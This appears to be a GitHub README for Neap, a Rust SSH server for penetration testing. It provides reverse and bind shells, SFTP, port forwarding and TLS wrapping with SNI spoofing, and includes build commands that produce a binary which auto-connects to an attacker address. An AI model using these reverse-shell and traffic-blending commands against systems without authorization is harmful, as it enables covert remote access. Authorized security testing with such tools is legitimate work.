<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-light.svg">
  <img alt="Neap" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Rust](https://img.shields.io/badge/language-Rust-orange.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-GPLv3-blue.svg)

**Statically-linked SSH server for penetration testing.**

Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) with TLS wrapping, SNI spoofing, and build-time configuration.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Quick Start

**Prerequisites:** Rust 1.75+, Cargo

```bash
git clone https://github.com/Real-Fruit-Snacks/Neap.git
cd Neap
make current
```

**Using build.sh (recommended):**

```bash
./build.sh reverse 192.168.1.10:4444
./build.sh listen 8888
./build.sh reverse 10.10.14.5:443 --tls --password "secret"
```

**Verify:**

```bash
./neap --help
```

---

## Features

### Reverse Shell

Dial home to attacker with full PTY support. Linux openpty and Windows ConPTY.

```bash
neap 192.168.1.10
neap -p 31337 kali@192.168.1.10
```

### Bind Shell

Listen for incoming SSH connections on a specified port.

```bash
neap -l -p 4444
neap -v -l -p 4444   # verbose
```

### SFTP File Transfer

Full SFTP subsystem for file upload and download over the SSH channel.

```bash
sftp -P 4444 user@target
```

### Port Forwarding

Local, remote, and dynamic (SOCKS5) forwarding through the SSH tunnel.

```bash
# Local forward
ssh -L 8080:internal:80 -p 4444 user@target

# Dynamic SOCKS5
ssh -D 1080 -p 4444 user@target
```

### TLS Wrapping

Wrap SSH traffic in TLS with SNI spoofing. Blends with normal HTTPS traffic.

```bash
./build.sh reverse 10.10.14.5:443 --tls
```

### Build-Time Configuration

All connection parameters baked at compile time. No runtime arguments needed on target.

```bash
./build.sh reverse 10.10.14.5:443 --password "s3cret" --tls
# Produces a binary that auto-connects with no flags needed
```

---

## Architecture

```
src/
├── main.rs          # Entry point and mode dispatch
├── server/          # SSH server implementation
├── client/          # Reverse connection client
├── shell/           # PTY handling (Linux + Windows ConPTY)
├── sftp/            # SFTP subsystem
├── forward/         # Port forwarding (local, remote, dynamic)
├── tls/             # TLS wrapping with SNI spoofing
└── config/          # Build-time configuration embedding
```

Two-mode architecture: bind (server listens) or reverse (client dials home). Both share the same SSH session layer with pluggable subsystems for shell, SFTP, and forwarding. TLS wrapping is transparent and optional.

---

## Platform Support

| | Linux | Windows |
|---|---|---|
| Reverse Shell | Full (PTY) | Full (ConPTY) |
| Bind Shell | Full (PTY) | Full (ConPTY) |
| SFTP | Full | Full |
| Port Forwarding | Full | Full |
| TLS Wrapping | Full | Full |
| Static Binary | musl | MSVC |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Neap/security/advisories). 90-day responsible disclosure.

**Neap does not:**
- Manage implant networks or tasking (not a C2)
- Generate exploits or payloads (not a framework)
- Destroy evidence or tamper with logs (not anti-forensics)
- Evade EDR behavioral detection (not evasion tooling)

---

## License

[GPLv3](LICENSE) — Copyright 2026 Real-Fruit-Snacks
